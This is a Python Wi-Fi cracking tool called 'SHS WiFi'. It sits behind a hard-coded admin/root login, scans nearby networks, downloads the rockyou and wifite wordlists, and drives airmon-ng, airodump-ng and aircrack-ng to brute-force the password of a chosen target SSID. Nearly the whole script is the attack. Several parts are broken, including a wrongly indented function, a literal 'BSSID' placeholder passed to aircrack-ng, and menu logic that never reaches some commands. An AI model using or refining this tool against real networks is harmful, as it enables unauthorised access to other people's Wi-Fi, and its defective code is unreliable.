
import os
import subprocess
import sys
import platform
import time
from colorama import init, Fore, Style
init()
os.system('sudo apt-get update')
os.system('sudo apt-get install pciutils')
os.system('sudo apt-get install network-manager')
os.system('sudo apt-get install wireless-tools')
os.system('sudo pip3 install wash')
print(Fore.RED + Style.BRIGHT + " [!] Make sure you have installed aircrack-ng, pciutilis, networkmanager, wireless-tools, setting up airodump-ng, airmon-ng. before continue" + Style.RESET_ALL)
time.sleep(5.5)

# detect platform
if platform.system() == 'Windows':
    os.system('cls')
else:
    os.system('clear')

def download_wordlist():
    try:
        wordlist_url_rockyou = "https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt"
        wordlist_filename_rockyou = "rockyou.txt"
        if not os.path.exists(wordlist_filename_rockyou):
            subprocess.run(['wget', '-O', wordlist_filename_rockyou, wordlist_url_rockyou])
            print("Wordlist (rockyou.txt) downloaded successfully!")
        else:
            print("Wordlist (rockyou.txt) already exists.")
        
        wordlist_url_new = "https://github.com/Mysteriza/WiFi-Password-Wordlist/raw/main/wifite.txt"
        wordlist_filename_new = "wifite.txt"
        if not os.path.exists(wordlist_filename_new):
            subprocess.run(['wget', '-O', wordlist_filename_new, wordlist_url_new])
            print("New wordlist (wifite.txt) downloaded successfully!")
        else:
            print("New wordlist (wifite.txt) already exists.")
    except Exception as e:
        print("Error downloading wordlists:", e)

def bruteforce_wifi(ssid):
    try:
        subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'])
        subprocess.run(['sudo', 'wash', '-i', 'wlan0mon'])
        subprocess.run(['sudo', 'airodump-ng', '-w', 'output', '--essid', ssid, 'wlan0mon'])
        subprocess.run(['sudo', 'aircrack-ng', '-w', 'rockyou.txt', '-w', 'wifite.txt', '-b', 'BSSID', 'output.cap'])
        print("Bruteforcing WiFi:", ssid)
    except Exception as e:
        print("Error bruteforcing WiFi:", e)

def bruteforce_custom_wordlist(ssid, wordlist):
    try:
        subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'])
        subprocess.run(['sudo', 'wash', '-i', 'wlan0mon'])
        subprocess.run(['sudo', 'airodump-ng', '-w', 'output', '--essid', ssid, 'wlan0mon'])
        subprocess.run(['sudo', 'aircrack-ng', '-w', wordlist, '-b', 'BSSID', 'output.cap'])
        print("Bruteforcing WiFi with custom wordlist:", ssid)
    except Exception as e:
        print("Error bruteforcing WiFi with custom wordlist:", e)

def bruteforce_specific_password(ssid, password):
    try:
        subprocess.run(['sudo', 'airmon-ng', 'start', 'wlan0'])
        subprocess.run(['sudo', 'wash', '-i', 'wlan0mon'])
        subprocess.run(['sudo', 'airodump-ng', '-w', 'output', '--essid', ssid, 'wlan0mon'])
        subprocess.run(['sudo', 'aircrack-ng', '-w', password, '-b', 'BSSID', 'output.cap'])
        print("Bruteforcing WiFi with specific password:", ssid)
    except Exception as e:
        print("Error bruteforcing WiFi with specific password:", e)

  def scan_wifi():
    try:
        result = subprocess.run(['sudo', 'iwlist', 'wlan0', 'scan'], capture_output=True, text=True)
        output = result.stdout
        networks = []
        current_network = {}
        lines = output.split('\n')
        for line in lines:
            if "Cell" in line:
                if current_network:
                    networks.append(current_network)
                    current_network = {}
                current_network["BSSID"] = line.split("Address: ")[1]
            elif "ESSID" in line:
                current_network["SSID"] = line.split("ESSID:")[1].strip('"')
            elif "Quality" in line:
                current_network["Quality"] = line.split("Quality=")[1].split(" ")[0]
                current_network["Signal Level"] = line.split("Signal level=")[1].split(" ")[0]
            elif "Encryption key" in line:
                current_network["Encryption"] = "Yes" if "on" in line else "No"
        print("Scanned WiFi networks:")
        for network in networks:
            print("SSID:", network.get("SSID", "Unknown"))
            print("BSSID:", network.get("BSSID", "Unknown"))
            print("Quality:", network.get("Quality", "Unknown"))
            print("Signal Level:", network.get("Signal Level", "Unknown"))
            print("Encryption:", network.get("Encryption", "Unknown"))
            print("-------------------------------")
    except Exception as e:
        print("Error scanning WiFi:", e)

def connect_wifi(ssid, password):
    try:
        subprocess.run(['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid, 'password', password])
        print("Connected to WiFi network:", ssid)
    except Exception as e:
        print("Error connecting to WiFi:", e)

def login():
    init()
    os.system('clear')
    usn = input(str(Fore.YELLOW + "🚀 USN > "))
    psw = input(str(Fore.YELLOW + "🚀 PSW > "))
    if usn == "admin" and psw == "root":
        main()
    else:
        print(Fore.RED + "Nice try kid 🚀")
        sys.exit()

def main():
    init()
    download_wordlist()

    os.system('clear')
    menu = """
        █████████████████
        █─▄▄▄▄█─█─█─▄▄▄▄█
        █▄▄▄▄─█─▄─█▄▄▄▄─█
        ▀▄▄▄▄▄▀▄▀▄▀▄▄▄▄▄▀      

        [scan] Scan WiFi Networks
        [bruteforce] Bruteforce WiFi
        [bruteforce_custom] Bruteforce WiFi with Custom Wordlist
        [bruteforce_specific] Bruteforce WiFi with Specific Password
        [connect] Connect to WiFi
        [usage] Guide command.
        [exit] Exit
        
        --- SHS WiFi ---
    """
    print(Fore.GREEN + menu)
    while True:
        command = input(Fore.CYAN + "Network > ").lower()
        if command == "scan":
            scan_wifi()
        elif command.startswith("bruteforce"):
            ssid = command.split(" ")[1]
            bruteforce_wifi(ssid)
        elif command.startswith("bruteforce_custom"):
            ssid, wordlist = command.split(" ")[1], command.split(" ")[2]
            bruteforce_custom_wordlist(ssid, wordlist)
        elif command.startswith("bruteforce_specific"):
            ssid, password = command.split(" ")[1], command.split(" ")[2]
            bruteforce_specific_password(ssid, password)
        elif command.startswith("connect"):
            try:
                ssid, password = command.split(" ")[1].split(":")
                connect_wifi(ssid, password)
            except Exception as e:
                print("Invalid 'connect' command format. Please use 'connect ssid:password'.")
        elif command == "usage":
            print("--- Usage ---")
            usage1="""
            [scan] Just like that, no additional comamnds
            [bruteforce] with target ssid > ( bruteforce targetssid )
            [bruteforce_custom] with target ssid and wordlist > ( bruteforce_custom targetssid <wordlist> ) Must move the wordlist to SHS folder
            [bruteforce_specific] with target ssid and password > ( bruteforce_specic <targetssid> <password> )
            [connect] with ssid and password separated by ':' > ( connect targetssid:password12345 )

            make sure to install networkmanager, aircrack-ng, airmon-ng, airdump-ng and pywifi also you cannot use 
            this script in termux ( even if you're rooted ), if you have a laptop/computer with windows on it, use that.
            """
            print(usage1)
        elif command == "relog":
            os.system('clear')
            login()
        elif command == "exit":
            break
        else:
            print("")

if __name__ == "__main__":
    login()
